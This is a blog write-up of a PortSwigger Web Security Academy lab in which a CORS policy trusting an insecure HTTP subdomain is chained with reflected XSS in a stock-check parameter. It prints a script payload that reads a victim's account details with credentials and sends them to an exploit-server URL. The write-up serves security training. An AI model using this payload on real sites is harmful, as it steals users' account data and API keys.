+++
date = '2026-07-07T13:43:16+08:00'
draft = false
title = "CORS vulnerability with trusted insecure protocols | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Just like the [last lab](/training/portswigger/cors/cors_apprentice2), the session cookie has `SameSite=None` and there is zero CSRF tokens or anything of the sort while querying for sensitive data on `/accountDetails`:
![](/images/viber_image_2026-07-07_13-19-50-990.png)
![](/images/viber_image_2026-07-07_13-20-02-482.png)
But unlike the last two labs, the web application here controls which origins can get in quite strictly. It withstands parsing errors and the `null` check, which would prove exfiltrating victim's data more difficult.

So naturally, we should probe other functionalities to find an attack surface. Notice the Check Stock add-on, is it rather odd that whenever we want to query stocks, it opens a window to an insecure HTTP subdomain?
![](/images/viber_image_2026-07-07_13-23-50-705.png)
Plus, this possibly vulnerable subdomain is on the whitelist, maybe this is our attack surface:
![](/images/viber_image_2026-07-07_13-51-48-735.png)
Upon closer inspection, to access stock level we do need to provide two necessary params `productId` and `storeId`. The site dictates the former must definitely be an integer, what if it isn't?
![](/images/viber_image_2026-07-07_13-28-56-360.png)
Rather than showing a generic error message, the web application on this subdomain reflects our wrong ID into the HTML. This smells of XSS vulnerabilities, let's test this by adding a harmless `h1` tag:
![](/images/viber_image_2026-07-07_13-29-12-473.png)
Surprisingly this works! We can inject arbitrary HTML and the parser *will* honor it. Using all these information in mind, we can just paste our old payload into `productId` and it will run smooth as butter:
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://<lab-id>.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://<exploit-server>/exploit?key='+this.responseText;
    };
</script>
```
However, pasting this directly may break due to some URL shenanigans. It's best practice to URL-encode the entire thing first, resulting in a gargantuan garbage as shown here:
![](/images/viber_image_2026-07-07_13-36-01-798.png)
After sending the payload to our victim, all those credentials will be logged and we can decode them as a result. Neat!
![](/images/viber_image_2026-07-07_13-42-56-633.png)
![](/images/viber_image_2026-07-07_13-43-13-064.png)